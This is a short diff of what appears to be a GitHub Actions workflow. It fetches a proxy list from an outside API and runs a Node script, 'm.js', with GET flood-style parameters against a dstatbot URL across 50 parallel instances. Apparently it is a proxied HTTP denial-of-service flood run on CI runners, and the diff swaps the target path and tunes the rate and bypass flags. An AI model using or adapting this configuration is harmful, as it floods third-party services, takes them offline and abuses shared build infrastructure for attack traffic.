@@ -31,7 +31,7 @@ jobs:
         run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > proxy.txt
       
       - name: Run m.js
-        run: node m.js GET https://c3.dstatbot.win/3n7o2CAh 400 8 100 proxy.txt --full --connect 
+        run: node m.js GET https://c3.dstatbot.win/W16ISMCh 400 4 1000 proxy.txt --bfw --connect --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50  # Match the matrix count
